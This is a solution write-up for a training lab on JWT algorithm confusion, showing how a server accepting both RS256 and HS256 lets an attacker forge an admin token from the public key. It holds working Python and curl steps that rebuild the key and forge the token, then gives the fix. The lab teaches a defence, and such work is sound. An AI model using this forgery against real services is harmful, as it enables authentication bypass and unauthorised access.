# Solution - Lab #4: Chameleon Hashes

## Root Cause

```javascript
jwt.verify(token, PUBLIC_KEY, {
  algorithms: ['RS256', 'HS256'],
});
```

The `algorithms` array allows both RS256 (asymmetric) and HS256 (symmetric). `jsonwebtoken@8.5.1` does not validate key types - it will use any PEM string as an HS256 HMAC secret without complaint. When an HS256 token arrives, the server computes `HMAC-SHA256(PUBLIC_KEY_PEM, header.payload)` and compares it to the signature. An attacker who has the public key can compute the same HMAC.

The public key is not secret. It is, by design, public. Exposing it on `/.well-known/jwks.json` for legitimate RS256 verification also hands the attacker everything they need.

## Exploit Steps

### 1. Login and observe the RS256 token

Login as any user (not `root`). The `session` cookie contains an RS256 JWT. Decode the header:

```json
{"alg": "RS256", "typ": "JWT", "kid": "k-..."}
```

### 2. Fetch the public key from JWKS

```bash
curl http://localhost:3000/.well-known/jwks.json
```

```json
{
  "keys": [{ "kty": "RSA", "kid": "k-...", "n": "...", "e": "AQAB" }]
}
```

Extract `n` and `e`.

### 3. Reconstruct the RSA public key as PEM

```python
from cryptography.hazmat.primitives.asymmetric.rsa import RSAPublicNumbers
from cryptography.hazmat.primitives.serialization import Encoding, PublicFormat
import base64

def b64url_dec(s):
    return base64.urlsafe_b64decode(s + "=" * (-len(s) % 4))

n = int.from_bytes(b64url_dec(n_b64), "big")
e = int.from_bytes(b64url_dec(e_b64), "big")
pem = RSAPublicNumbers(e, n).public_key().public_bytes(Encoding.PEM, PublicFormat.SubjectPublicKeyInfo)
```

The resulting PEM is byte-for-byte identical to the server's `keys/public.pem`.

### 4. Forge an HS256 token using the PEM as the HMAC secret

```python
import base64, hashlib, hmac, json

def b64url_enc(data):
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()

h   = b64url_enc(json.dumps({"alg":"HS256","typ":"JWT"}, separators=(',',':')).encode())
p   = b64url_enc(json.dumps({"name":"hacker","role":"admin"}, separators=(',',':')).encode())
sig = b64url_enc(hmac.new(pem, f"{h}.{p}".encode(), hashlib.sha256).digest())
forged = f"{h}.{p}.{sig}"
```

### 5. Call the admin endpoint

```bash
curl http://localhost:3000/api/admin/keys \
  -H "Cookie: session=<forged_token>"
```

Response:

```json
{
  "flag": "FLAG{r54_publ1c_k3y5_4r3_n0t_hm4c_s3cr3t5}",
  "keys": [...]
}
```

## Automated PoC

```bash
pip install requests cryptography pwntools
python poc.py
```

## Takeaway

Never mix asymmetric and symmetric algorithms in the same `algorithms` array. Lock the algorithm server-side:

```javascript
jwt.verify(token, PUBLIC_KEY, { algorithms: ['RS256'] });
```

An RS256-only configuration ignores any HS256 token entirely, regardless of what the client sends in the `alg` header.

## References

- [Lab: JWT authentication bypass via algorithm confusion (PortSwigger)](https://portswigger.net/web-security/jwt/algorithm-confusion/lab-jwt-authentication-bypass-via-algorithm-confusion) - Lab where the public key is exposed and used directly as the HMAC secret
- [jwt_key_confusion (aurainfosec)](https://github.com/aurainfosec/jwt_key_confusion) - Standalone tool for re-signing RS256 tokens as HS256 using the extracted public key
- [jwt_tool (ticarpi)](https://github.com/ticarpi/jwt_tool) - Automates the RS256->HS256 confusion attack end-to-end
